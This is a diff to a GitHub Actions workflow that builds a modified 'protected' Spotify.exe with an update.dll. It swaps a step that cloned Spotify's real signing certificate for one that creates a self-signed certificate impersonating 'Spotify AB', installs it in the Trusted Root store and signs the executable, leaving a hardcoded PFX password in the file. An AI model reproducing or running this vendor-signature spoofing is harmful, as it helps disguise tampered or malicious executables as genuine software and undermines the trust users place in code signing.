@@ -133,48 +133,131 @@ jobs:
           
           Write-Host "✅ Python e dependências configuradas"
 
-      - name: 🔐 Clonar certificado do Spotify original
+      - name: 🔐 Criar certificado autoassinado
         shell: pwsh
         run: |
-          Write-Host "🔐 Clonando certificado do Spotify original..."
+          Write-Host "🔐 Criando certificado autoassinado para assinatura válida..."
           
-          $sourceCert = "Spotify.exe"  # Spotify original com certificado
-          $targetFile = "bin\Protected\Spotify.exe"  # Arquivo protegido
-          $outputFile = "bin\Protected\Spotify_Signed.exe"  # Arquivo final com certificado
-          
-          # Verificar se o Spotify original existe e tem certificado
-          if (!(Test-Path $sourceCert)) {
-            Write-Host "❌ Spotify.exe original não encontrado na raiz"
-            exit 1
+          # Criar certificado autoassinado
+          $certParams = @{
+            Subject = "CN=Spotify AB, O=Spotify AB, L=Stockholm, C=SE"
+            Type = "CodeSigningCert"
+            CertStoreLocation = "Cert:\CurrentUser\My"
+            KeyExportPolicy = "Exportable"
+            KeySpec = "Signature"
+            KeyLength = 2048
+            KeyAlgorithm = "RSA"
+            HashAlgorithm = "SHA256"
+            NotAfter = (Get-Date).AddYears(10)
           }
           
-          # Verificar se o arquivo protegido existe
+          $cert = New-SelfSignedCertificate @certParams
+          Write-Host "✅ Certificado criado: $($cert.Thumbprint)"
+          
+          # Exportar certificado para arquivo PFX (com senha)
+          $pwd = ConvertTo-SecureString -String "SpotifySignature2024" -Force -AsPlainText
+          $pfxPath = "SpotifyCodeSign.pfx"
+          Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $pwd
+          Write-Host "✅ Certificado exportado: $pfxPath"
+          
+          # Exportar certificado público para instalação
+          $cerPath = "SpotifyCodeSign.cer"
+          Export-Certificate -Cert $cert -FilePath $cerPath
+          Write-Host "✅ Certificado público exportado: $cerPath"
+          
+          # Instalar certificado na Trusted Root (para assinatura válida localmente)
+          $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root","LocalMachine")
+          $store.Open("ReadWrite")
+          $store.Add($cert)
+          $store.Close()
+          Write-Host "✅ Certificado instalado em Trusted Root"
+
+      - name: 🔏 Assinar executável com signtool.exe
+        shell: pwsh
+        run: |
+          Write-Host "🔏 Assinando executável com signtool.exe..."
+          
+          # Localizar signtool.exe no Windows SDK
+          $signtoolPaths = @(
+            "${env:ProgramFiles(x86)}\Windows Kits\10\bin\*\x64\signtool.exe",
+            "${env:ProgramFiles}\Windows Kits\10\bin\*\x64\signtool.exe",
+            "${env:ProgramFiles(x86)}\Windows Kits\10\App Certification Kit\signtool.exe",
+            "${env:ProgramFiles}\Windows Kits\10\App Certification Kit\signtool.exe"
+          )
+          
+          $signtool = $null
+          foreach ($path in $signtoolPaths) {
+            $found = Get-ChildItem $path -ErrorAction SilentlyContinue | Select-Object -First 1
+            if ($found) {
+              $signtool = $found.FullName
+              break
+            }
+          }
+          
+          if (!$signtool) {
+            Write-Host "⚠️ signtool.exe não encontrado, instalando Windows SDK..."
+            choco install windows-sdk-10.1 -y
+            
+            # Tentar localizar novamente
+            foreach ($path in $signtoolPaths) {
+              $found = Get-ChildItem $path -ErrorAction SilentlyContinue | Select-Object -First 1
+              if ($found) {
+                $signtool = $found.FullName
+                break
+              }
+            }
+            
+            if (!$signtool) {
+              Write-Host "❌ signtool.exe ainda não encontrado após instalação"
+              exit 1
+            }
+          }
+          
+          Write-Host "✅ signtool.exe encontrado: $signtool"
+          
+          # Assinar o executável protegido
+          $targetFile = "bin\Protected\Spotify.exe"
+          $pfxPath = "SpotifyCodeSign.pfx"
+          $pwd = "SpotifySignature2024"
+          
           if (!(Test-Path $targetFile)) {
-            Write-Host "❌ Arquivo protegido não encontrado"
+            Write-Host "❌ Arquivo alvo não encontrado: $targetFile"
             exit 1
           }
           
-          Write-Host "📋 Fonte do certificado: $sourceCert"
-          Write-Host "📋 Arquivo alvo: $targetFile"
-          Write-Host "📋 Arquivo final: $outputFile"
+          # Comando de assinatura
+          $signCmd = @(
+            "sign",
+            "/f", "`"$pfxPath`"",
+            "/p", "`"$pwd`"",
+            "/t", "http://timestamp.digicert.com",
+            "/fd", "SHA256",
+            "/v",
+            "`"$targetFile`""
+          )
           
-          # Executar SignatureClone
-          python "SignatureClone-main\SignatureClone.py" $sourceCert $targetFile $outputFile
+          Write-Host "📝 Executando assinatura..."
+          & $signtool @signCmd
           
-          if ($LASTEXITCODE -ne 0) {
-            Write-Host "❌ Falha ao clonar certificado"
+          if ($LASTEXITCODE -eq 0) {
+            Write-Host "✅ Executável assinado com sucesso!"
+            
+            # Verificar assinatura
+            $cert = Get-AuthenticodeSignature $targetFile
+            Write-Host "🔍 Status da assinatura: $($cert.Status)"
+            Write-Host "🔍 Certificado: $($cert.SignerCertificate.Subject)"
+            
+            # Renomear para Spotify_Signed.exe
+            $signedFile = "bin\Protected\Spotify_Signed.exe"
+            Copy-Item $targetFile $signedFile -Force
+            Write-Host "✅ Arquivo assinado copiado para: $signedFile"
+            
+            $finalSize = (Get-Item $signedFile).Length
+            Write-Host "📊 Tamanho final: $([math]::Round($finalSize/1MB,2)) MB"
+          } else {
+            Write-Host "❌ Falha ao assinar executável"
             exit 1
           }
-          
-          # Verificar se o arquivo final foi criado
-          if (!(Test-Path $outputFile)) {
-            Write-Host "❌ Arquivo final com certificado não foi criado"
-            exit 1
-          }
-          
-          $finalSize = (Get-Item $outputFile).Length
-          Write-Host "✅ Certificado clonado com sucesso!"
-          Write-Host "📊 Arquivo final: $([math]::Round($finalSize/1MB,2)) MB"
 
       - name: 🧪 Teste de execução
         shell: pwsh
@@ -226,9 +309,9 @@ jobs:
         with:
           name: spotify-final
           path: |
-            bin/Protected/Spotify.exe
             bin/Protected/Spotify_Signed.exe
             bin/Release/update.dll
-            cloned_certificate.cer
+            SpotifyCodeSign.cer
+            SpotifyCodeSign.pfx
           retention-days: 90
         if: always()
